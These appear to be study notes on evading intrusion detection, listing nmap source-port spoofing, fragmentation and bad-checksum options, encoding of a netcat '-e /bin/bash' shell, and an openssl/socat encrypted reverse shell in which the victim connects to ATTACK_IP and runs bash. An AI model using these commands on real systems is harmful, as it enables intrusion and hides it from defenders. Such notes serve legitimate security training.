### Tools: nmap, netcat/socat

# EVASION VIA PROTOCOL MANIPULATION

### 1) Relying on a different protocol

### 2) Manipulating (source) TCP/UDP Port

### 3) Using session splicing (IP Packet fragmentation)

### 4) Sending invalid packets

## 1st technique example

#### 1) nc -lvnp 25 (Gives the imp[ression that it is a usual TCP connection with an SMTP server)

#### Counter: Deep Packet Inspection (DPI)

#### 2) nc -ulvnp 162 (UDP Connection)

#### Counter: DPI

# 2nd Technique example

#### 1) nmap -sS -Pn -g 80 -F TARGET_IP (HTTP Server spoof)

#### 2) nmap -sU -Pn -g 53 -F TARGET_IP (DNS Server spoof)

#### 3) Can be used with netcat as well

# 3rd Technique example

### nmap options: 

#### -f = Set the data in IP packet to 8 bytes

#### -ff = To limit the data in the IP packet to 16 bytes at most

#### --mtu SIZE = Custom data size (Multiple of 8)

# 4th Technique example

### nmap options:

#### --badsum

#### --scanflags: URG ACK PSH RST SYN FIN (Custom TCP flag combinations)

# EVASION VIA PAYLOAD MANIPULATION

### 1) Obfuscating and encoding the payload

### 2) Encrypting the communication channel

### 3) Modifying the shellcode

# 1st Technique example

### 1) Encode to Base64 format

#### 1: cat input.txt

#### 2: nc -lvnp 1234 -e /bin/bash

#### 3: base64 input.txt

### 2) URL Encoding

#### urlencode nc -lvnp 1234 -e /bin/bash

### 3) Escaped Unicode

### Tool: Cyberchef

#### 1) Search "Escape Unicode Characters"

#### 2) Drag to recipe

#### 3) Checkmark "encode all chars with a prefix of \u"

#### 4) Checkmark "Uppercase hex with a padding of 4"

## 2nd Technique example

### Encrypted reverse shell steps:

### 1) Create the key

### 2) Listen on the attacker's machine

### 3) Connect to the attacker's machine

#### 1) openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.example.gr/O=example COM/C=GR' -nodes -keyout gr-reverse.key -out gr-reverse.crt

#### 2) cat gr-reverse.key gr-reverse.crt > gr-reverse.pem

#### 3) socat -d -d OPENSSL-LISTEN:4443,cert=gr-reverse.pem,verify=0,fork STDOUT

#### 4) Victim: socat OPENSSL:ATTACK_IP:4443,verify=0 EXEC:/bin/bash


